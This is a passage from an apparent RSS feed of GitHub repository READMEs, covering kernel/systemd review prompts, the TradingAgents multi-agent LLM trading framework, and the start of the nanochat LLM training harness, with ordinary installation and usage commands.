&lt;h2&gt;Available Commands&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Project&lt;/th&gt; 
   &lt;th&gt;Review&lt;/th&gt; 
   &lt;th&gt;Debug&lt;/th&gt; 
   &lt;th&gt;Verify&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Kernel&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/kreview&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/kdebug&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/kverify&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;systemd&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/systemd-review&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/systemd-debug&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/systemd-verify&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;Project Documentation&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/masoncl/review-prompts/main/kernel/README.md"&gt;Kernel Review Prompts&lt;/a&gt; - Linux kernel specific patterns and protocols&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/masoncl/review-prompts/main/systemd/README.md"&gt;systemd Review Prompts&lt;/a&gt; - systemd specific patterns and protocols&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;How It Works&lt;/h2&gt; 
&lt;p&gt;Each project has:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Skill file&lt;/strong&gt; - Automatically loads context when working in the project tree&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Slash commands&lt;/strong&gt; - Quick access to review, debug, and verify workflows&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Subsystem files&lt;/strong&gt; - Domain-specific knowledge loaded on demand&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The skills detect your working directory and load appropriate context:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;In a kernel tree: kernel skill loads automatically&lt;/li&gt; 
 &lt;li&gt;In a systemd tree: systemd skill loads automatically&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Structure&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;review-prompts/
‚îú‚îÄ‚îÄ kernel/                    # Linux kernel prompts
‚îÇ   ‚îú‚îÄ‚îÄ skills/               # Skill template
‚îÇ   ‚îú‚îÄ‚îÄ slash-commands/       # /kreview, /kdebug, /kverify
‚îÇ   ‚îú‚îÄ‚îÄ scripts/              # Setup script and utilities
‚îÇ   ‚îú‚îÄ‚îÄ patterns/             # Bug pattern documentation
‚îÇ   ‚îî‚îÄ‚îÄ *.md                  # Subsystem and protocol files
‚îÇ
‚îú‚îÄ‚îÄ systemd/                   # systemd prompts
‚îÇ   ‚îú‚îÄ‚îÄ skills/               # Skill template
‚îÇ   ‚îú‚îÄ‚îÄ slash-commands/       # /systemd-review, /systemd-debug, /systemd-verify
‚îÇ   ‚îú‚îÄ‚îÄ scripts/              # Setup script
‚îÇ   ‚îú‚îÄ‚îÄ patterns/             # Bug pattern documentation
‚îÇ   ‚îî‚îÄ‚îÄ *.md                  # Subsystem and protocol files
‚îÇ
‚îî‚îÄ‚îÄ README.md                  # This file
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Semcode Integration&lt;/h2&gt; 
&lt;p&gt;These prompts work best with &lt;a href="https://github.com/facebookexperimental/semcode"&gt;semcode&lt;/a&gt; for fast code navigation and semantic search.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/masoncl/review-prompts/main/kernel/LICENSE"&gt;kernel/LICENSE&lt;/a&gt; for license information.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>TauricResearch/TradingAgents</title>
      <link>https://github.com/TauricResearch/TradingAgents</link>
      <description>&lt;p&gt;TradingAgents: Multi-Agents LLM Financial Trading Framework&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/TauricResearch.png" style="width: 60%; height: auto;" /&gt; &lt;/p&gt; 
&lt;div align="center" style="line-height: 1;"&gt; 
 &lt;a href="https://arxiv.org/abs/2412.20138" target="_blank"&gt;&lt;img alt="arXiv" src="https://img.shields.io/badge/arXiv-2412.20138-B31B1B?logo=arxiv" /&gt;&lt;/a&gt; 
 &lt;a href="https://discord.com/invite/hk9PGKShPK" target="_blank"&gt;&lt;img alt="Discord" src="https://img.shields.io/badge/Discord-TradingResearch-7289da?logo=discord&amp;amp;logoColor=white&amp;amp;color=7289da" /&gt;&lt;/a&gt; 
 &lt;a href="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/wechat.png" target="_blank"&gt;&lt;img alt="WeChat" src="https://img.shields.io/badge/WeChat-TauricResearch-brightgreen?logo=wechat&amp;amp;logoColor=white" /&gt;&lt;/a&gt; 
 &lt;a href="https://x.com/TauricResearch" target="_blank"&gt;&lt;img alt="X Follow" src="https://img.shields.io/badge/X-TauricResearch-white?logo=x&amp;amp;logoColor=white" /&gt;&lt;/a&gt; 
 &lt;br /&gt; 
 &lt;a href="https://github.com/TauricResearch/" target="_blank"&gt;&lt;img alt="Community" src="https://img.shields.io/badge/Join_GitHub_Community-TauricResearch-14C290?logo=discourse" /&gt;&lt;/a&gt; 
&lt;/div&gt; 
&lt;div align="center"&gt; 
 &lt;!-- Keep these links. Translations will automatically update with the README. --&gt; 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=de"&gt;Deutsch&lt;/a&gt; | 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=es"&gt;Espa√±ol&lt;/a&gt; | 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=fr"&gt;fran√ßais&lt;/a&gt; | 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=ja"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=ko"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=pt"&gt;Portugu√™s&lt;/a&gt; | 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=ru"&gt;–†—É—Å—Å–∫–∏–π&lt;/a&gt; | 
 &lt;a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=zh"&gt;‰∏≠Êñá&lt;/a&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h1&gt;TradingAgents: Multi-Agents LLM Financial Trading Framework&lt;/h1&gt; 
&lt;h2&gt;News&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;[2026-02] &lt;strong&gt;TradingAgents v0.2.0&lt;/strong&gt; released with multi-provider LLM support (GPT-5.x, Gemini 3.x, Claude 4.x, Grok 4.x) and improved system architecture.&lt;/li&gt; 
 &lt;li&gt;[2026-01] &lt;strong&gt;Trading-R1&lt;/strong&gt; &lt;a href="https://arxiv.org/abs/2509.11420"&gt;Technical Report&lt;/a&gt; released, with &lt;a href="https://github.com/TauricResearch/Trading-R1"&gt;Terminal&lt;/a&gt; expected to land soon.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://www.star-history.com/#TauricResearch/TradingAgents&amp;amp;Date"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=TauricResearch/TradingAgents&amp;amp;type=Date&amp;amp;theme=dark" /&gt; 
   &lt;source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=TauricResearch/TradingAgents&amp;amp;type=Date" /&gt; 
   &lt;img alt="TradingAgents Star History" src="https://api.star-history.com/svg?repos=TauricResearch/TradingAgents&amp;amp;type=Date" style="width: 80%; height: auto;" /&gt; 
  &lt;/picture&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;üéâ &lt;strong&gt;TradingAgents&lt;/strong&gt; officially released! We have received numerous inquiries about the work, and we would like to express our thanks for the enthusiasm in our community.&lt;/p&gt; 
 &lt;p&gt;So we decided to fully open-source the framework. Looking forward to building impactful projects with you!&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt;üöÄ &lt;a href="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/#tradingagents-framework"&gt;TradingAgents&lt;/a&gt; | ‚ö° &lt;a href="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/#installation-and-cli"&gt;Installation &amp;amp; CLI&lt;/a&gt; | üé¨ &lt;a href="https://www.youtube.com/watch?v=90gr5lwjIho"&gt;Demo&lt;/a&gt; | üì¶ &lt;a href="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/#tradingagents-package"&gt;Package Usage&lt;/a&gt; | ü§ù &lt;a href="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/#contributing"&gt;Contributing&lt;/a&gt; | üìÑ &lt;a href="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/#citation"&gt;Citation&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;TradingAgents Framework&lt;/h2&gt; 
&lt;p&gt;TradingAgents is a multi-agent trading framework that mirrors the dynamics of real-world trading firms. By deploying specialized LLM-powered agents: from fundamental analysts, sentiment experts, and technical analysts, to trader, risk management team, the platform collaboratively evaluates market conditions and informs trading decisions. Moreover, these agents engage in dynamic discussions to pinpoint the optimal strategy.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/schema.png" style="width: 100%; height: auto;" /&gt; &lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;TradingAgents framework is designed for research purposes. Trading performance may vary based on many factors, including the chosen backbone language models, model temperature, trading periods, the quality of data, and other non-deterministic factors. &lt;a href="https://tauric.ai/disclaimer/"&gt;It is not intended as financial, investment, or trading advice.&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Our framework decomposes complex trading tasks into specialized roles. This ensures the system achieves a robust, scalable approach to market analysis and decision-making.&lt;/p&gt; 
&lt;h3&gt;Analyst Team&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Fundamentals Analyst: Evaluates company financials and performance metrics, identifying intrinsic values and potential red flags.&lt;/li&gt; 
 &lt;li&gt;Sentiment Analyst: Analyzes social media and public sentiment using sentiment scoring algorithms to gauge short-term market mood.&lt;/li&gt; 
 &lt;li&gt;News Analyst: Monitors global news and macroeconomic indicators, interpreting the impact of events on market conditions.&lt;/li&gt; 
 &lt;li&gt;Technical Analyst: Utilizes technical indicators (like MACD and RSI) to detect trading patterns and forecast price movements.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/analyst.png" width="100%" style="display: inline-block; margin: 0 2%;" /&gt; &lt;/p&gt; 
&lt;h3&gt;Researcher Team&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Comprises both bullish and bearish researchers who critically assess the insights provided by the Analyst Team. Through structured debates, they balance potential gains against inherent risks.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/researcher.png" width="70%" style="display: inline-block; margin: 0 2%;" /&gt; &lt;/p&gt; 
&lt;h3&gt;Trader Agent&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Composes reports from the analysts and researchers to make informed trading decisions. It determines the timing and magnitude of trades based on comprehensive market insights.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/trader.png" width="70%" style="display: inline-block; margin: 0 2%;" /&gt; &lt;/p&gt; 
&lt;h3&gt;Risk Management and Portfolio Manager&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Continuously evaluates portfolio risk by assessing market volatility, liquidity, and other risk factors. The risk management team evaluates and adjusts trading strategies, providing assessment reports to the Portfolio Manager for final decision.&lt;/li&gt; 
 &lt;li&gt;The Portfolio Manager approves/rejects the transaction proposal. If approved, the order will be sent to the simulated exchange and executed.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/risk.png" width="70%" style="display: inline-block; margin: 0 2%;" /&gt; &lt;/p&gt; 
&lt;h2&gt;Installation and CLI&lt;/h2&gt; 
&lt;h3&gt;Installation&lt;/h3&gt; 
&lt;p&gt;Clone TradingAgents:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/TauricResearch/TradingAgents.git
cd TradingAgents
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Create a virtual environment in any of your favorite environment managers:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;conda create -n tradingagents python=3.13
conda activate tradingagents
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Install dependencies:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Required APIs&lt;/h3&gt; 
&lt;p&gt;TradingAgents supports multiple LLM providers. Set the API key for your chosen provider:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=...          # OpenAI (GPT)
export GOOGLE_API_KEY=...          # Google (Gemini)
export ANTHROPIC_API_KEY=...       # Anthropic (Claude)
export XAI_API_KEY=...             # xAI (Grok)
export OPENROUTER_API_KEY=...      # OpenRouter
export ALPHA_VANTAGE_API_KEY=...   # Alpha Vantage
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For local models, configure Ollama with &lt;code&gt;llm_provider: "ollama"&lt;/code&gt; in your config.&lt;/p&gt; 
&lt;p&gt;Alternatively, copy &lt;code&gt;.env.example&lt;/code&gt; to &lt;code&gt;.env&lt;/code&gt; and fill in your keys:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cp .env.example .env
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;CLI Usage&lt;/h3&gt; 
&lt;p&gt;You can also try out the CLI directly by running:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python -m cli.main
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You will see a screen where you can select your desired tickers, date, LLMs, research depth, etc.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/cli/cli_init.png" width="100%" style="display: inline-block; margin: 0 2%;" /&gt; &lt;/p&gt; 
&lt;p&gt;An interface will appear showing results as they load, letting you track the agent's progress as it runs.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/cli/cli_news.png" width="100%" style="display: inline-block; margin: 0 2%;" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/TauricResearch/TradingAgents/main/assets/cli/cli_transaction.png" width="100%" style="display: inline-block; margin: 0 2%;" /&gt; &lt;/p&gt; 
&lt;h2&gt;TradingAgents Package&lt;/h2&gt; 
&lt;h3&gt;Implementation Details&lt;/h3&gt; 
&lt;p&gt;We built TradingAgents with LangGraph to ensure flexibility and modularity. The framework supports multiple LLM providers: OpenAI, Google, Anthropic, xAI, OpenRouter, and Ollama.&lt;/p&gt; 
&lt;h3&gt;Python Usage&lt;/h3&gt; 
&lt;p&gt;To use TradingAgents inside your code, you can import the &lt;code&gt;tradingagents&lt;/code&gt; module and initialize a &lt;code&gt;TradingAgentsGraph()&lt;/code&gt; object. The &lt;code&gt;.propagate()&lt;/code&gt; function will return a decision. You can run &lt;code&gt;main.py&lt;/code&gt;, here's also a quick example:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from tradingagents.graph.trading_graph import TradingAgentsGraph
from tradingagents.default_config import DEFAULT_CONFIG

ta = TradingAgentsGraph(debug=True, config=DEFAULT_CONFIG.copy())

# forward propagate
_, decision = ta.propagate("NVDA", "2026-01-15")
print(decision)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can also adjust the default configuration to set your own choice of LLMs, debate rounds, etc.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from tradingagents.graph.trading_graph import TradingAgentsGraph
from tradingagents.default_config import DEFAULT_CONFIG

config = DEFAULT_CONFIG.copy()
config["llm_provider"] = "openai"        # openai, google, anthropic, xai, openrouter, ollama
config["deep_think_llm"] = "gpt-5.2"     # Model for complex reasoning
config["quick_think_llm"] = "gpt-5-mini" # Model for quick tasks
config["max_debate_rounds"] = 2

ta = TradingAgentsGraph(debug=True, config=config)
_, decision = ta.propagate("NVDA", "2026-01-15")
print(decision)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;See &lt;code&gt;tradingagents/default_config.py&lt;/code&gt; for all configuration options.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;We welcome contributions from the community! Whether it's fixing a bug, improving documentation, or suggesting a new feature, your input helps make this project better. If you are interested in this line of research, please consider joining our open-source financial AI research community &lt;a href="https://tauric.ai/"&gt;Tauric Research&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Citation&lt;/h2&gt; 
&lt;p&gt;Please reference our work if you find &lt;em&gt;TradingAgents&lt;/em&gt; provides you with some help :)&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;@misc{xiao2025tradingagentsmultiagentsllmfinancial,
      title={TradingAgents: Multi-Agents LLM Financial Trading Framework}, 
      author={Yijia Xiao and Edward Sun and Di Luo and Wei Wang},
      year={2025},
      eprint={2412.20138},
      archivePrefix={arXiv},
      primaryClass={q-fin.TR},
      url={https://arxiv.org/abs/2412.20138}, 
}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>karpathy/nanochat</title>
      <link>https://github.com/karpathy/nanochat</link>
      <description>&lt;p&gt;The best ChatGPT that $100 can buy.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;nanochat&lt;/h1&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/nanochat.png" alt="nanochat logo" /&gt; &lt;img src="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/scaling_laws_jan26.png" alt="scaling laws" /&gt;&lt;/p&gt; 
&lt;p&gt;nanochat is the simplest experimental harness for training LLMs. It is designed to run on a single GPU node, the code is minimal/hackable, and it covers all major LLM stages including tokenization, pretraining, finetuning, evaluation, inference, and a chat UI. For example, you can train your own GPT-2 capability LLM (which cost ~$50,000 to train in 2019) for only $73 (3 hours of 8XH100 GPU node) and then talk to it in a familiar ChatGPT-like web UI.&lt;/p&gt; 
&lt;p&gt;For questions about the repo, I recommend either using &lt;a href="https://deepwiki.com/karpathy/nanochat"&gt;DeepWiki&lt;/a&gt; from Devin/Cognition to ask questions about the repo, or use the &lt;a href="https://github.com/karpathy/nanochat/discussions"&gt;Discussions tab&lt;/a&gt;, or come by the &lt;a href="https://discord.com/channels/1020383067459821711/1427295580895314031"&gt;#nanochat&lt;/a&gt; channel on Discord.&lt;/p&gt; 
&lt;h2&gt;Updates&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;(Jan 31 2026) Major revamp of all scripts/README ongoing, deleting midtraining stage, might be a bit messy briefly...&lt;/li&gt; 
 &lt;li&gt;(Jan 30 2026) With all the latest improvements we're able to train GPT-2 grade LLM in about $73. The &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/speedrun.sh"&gt;runs/speedrun.sh&lt;/a&gt; script will become the refernece way to train GPT-2 grade model and talk to it.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Leaderboard&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;#&lt;/th&gt; 
   &lt;th&gt;time&lt;/th&gt; 
   &lt;th&gt;val_bpb&lt;/th&gt; 
   &lt;th&gt;CORE&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Date&lt;/th&gt; 
   &lt;th&gt;Commit&lt;/th&gt; 
   &lt;th&gt;Contributors&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;0&lt;/td&gt; 
   &lt;td&gt;168 hours&lt;/td&gt; 
   &lt;td&gt;-&lt;/td&gt; 
   &lt;td&gt;0.2565&lt;/td&gt; 
   &lt;td&gt;Original OpenAI GPT-2 checkpoint&lt;/td&gt; 
   &lt;td&gt;2019&lt;/td&gt; 
   &lt;td&gt;-&lt;/td&gt; 
   &lt;td&gt;OpenAI&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;1&lt;/td&gt; 
   &lt;td&gt;3.04&lt;/td&gt; 
   &lt;td&gt;0.74833&lt;/td&gt; 
   &lt;td&gt;0.2585&lt;/td&gt; 
   &lt;td&gt;d24 baseline, slightly overtrained&lt;/td&gt; 
   &lt;td&gt;Jan 29 2026&lt;/td&gt; 
   &lt;td&gt;348fbb3&lt;/td&gt; 
   &lt;td&gt;@karpathy&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;2&lt;/td&gt; 
   &lt;td&gt;2.91&lt;/td&gt; 
   &lt;td&gt;0.74504&lt;/td&gt; 
   &lt;td&gt;0.2578&lt;/td&gt; 
   &lt;td&gt;d26 slightly undertrained &lt;strong&gt;+fp8&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Feb 2 2026&lt;/td&gt; 
   &lt;td&gt;8309b83&lt;/td&gt; 
   &lt;td&gt;@karpathy&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;The primary metric we care about is "time to GPT-2" - the wall clock time needed to outperform the GPT-2 (1.6B) CORE metric on an 8XH100 GPU node. The GPT-2 CORE score is 0.256525. In 2019, the training of GPT-2 cost approximately $50,000 so it is incredible that due to many advances over 7 years across the stack, we can now do so much faster and for well below $100 (e.g. at the current ~$3/GPU/hr, an 8XH100 node is ~$24/hr, so 3 hours is ~$72).&lt;/p&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/LEADERBOARD.md"&gt;dev/LEADERBOARD.md&lt;/a&gt; for more docs on how to interpret and contribute to the leaderboard.&lt;/p&gt; 
&lt;h2&gt;Getting started&lt;/h2&gt; 
&lt;h3&gt;Reproduce and talk to GPT-2&lt;/h3&gt; 
&lt;p&gt;The most fun you can have is to train your own GPT-2 and talk to it. The entire pipeline to do so is contained in the single file &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/speedrun.sh"&gt;runs/speedrun.sh&lt;/a&gt;, which is designed to be run on an 8XH100 GPU node. Currently, at ~$24/hour for these nodes, pretraining GPT-2 grade model takes approximately 3 hours and will set you back about $75. Boot up a new 8XH100 GPU box from your favorite provider (e.g. I use and like &lt;a href="https://lambda.ai/service/gpu-cloud"&gt;Lambda&lt;/a&gt;), and kick off the training script:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;bash runs/speedrun.sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You mish to do so in a screen session as this will take ~3 hours to run. Once it's done, you can talk to it via the ChatGPT-like web UI. Make sure again that your local uv virtual environment is active (run &lt;code&gt;source .venv/bin/activate&lt;/code&gt;), and serve it:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python -m scripts.chat_web
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;And then visit the URL shown. Make sure to access it correctly, e.g. on Lambda use the public IP of the node you're on, followed by the port, so for example &lt;a href="http://209.20.xxx.xxx:8000/"&gt;http://209.20.xxx.xxx:8000/&lt;/a&gt;, etc. Then talk to your LLM as you'd normally talk to ChatGPT! Get it to write stories or poems. Ask it to tell you who you are to see a hallucination. Ask it why the sky is blue. Or why it's green. The speedrun is a 4e19 FLOPs capability model so it's a bit like talking to a kindergartener :).&lt;/p&gt; 
&lt;hr /&gt; 
&lt;img width="2672" height="1520" alt="image" src="https://github.com/user-attachments/assets/ed39ddf8-2370-437a-bedc-0f39781e76b5" /&gt; 
&lt;hr /&gt; 
&lt;p&gt;A few more notes:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The code will run just fine on the Ampere 8XA100 GPU node as well, but a bit slower.&lt;/li&gt; 
 &lt;li&gt;All code will run just fine on even a single GPU by omitting &lt;code&gt;torchrun&lt;/code&gt;, and will produce ~identical results (code will automatically switch to gradient accumulation), but you'll have to wait 8 times longer.&lt;/li&gt; 
 &lt;li&gt;If your GPU(s) have less than 80GB, you'll have to tune some of the hyperparameters or you will OOM / run out of VRAM. Look for &lt;code&gt;--device_batch_size&lt;/code&gt; in the scripts and reduce it until things fit. E.g. from 32 (default) to 16, 8, 4, 2, or even 1. Less than that you'll have to know a bit more what you're doing and get more creative.&lt;/li&gt; 
 &lt;li&gt;Most of the code is fairly vanilla PyTorch so it should run on anything that supports that - xpu, mps, or etc, but I haven't personally exercised all of these code paths so there might be sharp edges.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Research&lt;/h2&gt; 
&lt;p&gt;If you are a researcher and wish to help improve nanochat, two scripts of interest are &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/scaling_laws.sh"&gt;runs/scaling_laws.sh&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/miniseries.sh"&gt;runs/miniseries.sh&lt;/a&gt;. See &lt;a href="https://github.com/karpathy/nanochat/discussions/420"&gt;Jan 7 miniseries v1&lt;/a&gt; for related documentation. For quick experimentation (~5 min pretraining runs) my favorite scale is to train a 12-layer model (GPT-1 sized), e.g. like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;OMP_NUM_THREADS=1 torchrun --standalone --nproc_per_node=8 -m scripts.base_train -- \
    --depth=12 \
    --run="d12" \
    --model-tag="d12" \
    --core-metric-every=999999 \
    --sample-every=-1 \
    --save-every=-1 \
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This uses wandb (run name "d12"), only runs the CORE metric on last step, and it doesn't sample and save intermediate checkpoints. I like to change something in the code, re-run a d12 (or a d16 etc) and see if it helped, in an iteration loop.&lt;/p&gt; 
&lt;p&gt;The overall approach is to treat the depth of the model as the single dial of complexity. By sweeping out the depth, we get increasingly more powerful models. We determine the scaling laws, set the data budget to a compute optimal setting, train a whole miniseries of models of increasing sizes, and compare them to the GPT-2 and GPT-3 miniseries. Right now, beating GPT-2 specifically faster and faster is the most interesting target.&lt;/p&gt; 
&lt;h2&gt;Running on CPU / MPS&lt;/h2&gt; 
&lt;p&gt;The script &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/runcpu.sh"&gt;runs/runcpu.sh&lt;/a&gt; shows a very simple example of running on CPU or Apple Silicon. It dramatically shrinks the LLM tha tis being trained to make things fit into a reasonable time interval of a few ten minutes of training. You will not get strong results in this way.&lt;/p&gt; 
&lt;h2&gt;Guides&lt;/h2&gt; 
&lt;p&gt;I've published a number of guides that might contain helpful information:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/karpathy/nanochat/discussions/1"&gt;Oct 13 2025 original nanochat post&lt;/a&gt; introducing nanochat, though now it contains some deprecated information and the model is a lot older (with worse results) than current master.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/karpathy/nanochat/discussions/420"&gt;Jan 7 miniseries v1&lt;/a&gt; documents the first nanochat miniseries of models.&lt;/li&gt; 
 &lt;li&gt;To customize your nanochat, see &lt;a href="https://github.com/karpathy/nanochat/discussions/139"&gt;Guide: infusing identity to your nanochat&lt;/a&gt; in Discussions, which describes how you can tune your nanochat's personality through synthetic data generation and mixing that data into the SFT stage.&lt;/li&gt; 
 &lt;li&gt;To add new abilities to nanochat, see &lt;a href="https://github.com/karpathy/nanochat/discussions/164"&gt;Guide: counting r in strawberry (and how to add abilities generally)&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;File structure&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;.
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ dev
‚îÇ   ‚îú‚îÄ‚îÄ gen_synthetic_data.py       # Example synthetic data for identity
‚îÇ   ‚îú‚îÄ‚îÄ generate_logo.html
‚îÇ   ‚îú‚îÄ‚îÄ nanochat.png
‚îÇ   ‚îî‚îÄ‚îÄ repackage_data_reference.py # Pretraining data shard generation
‚îú‚îÄ‚îÄ nanochat
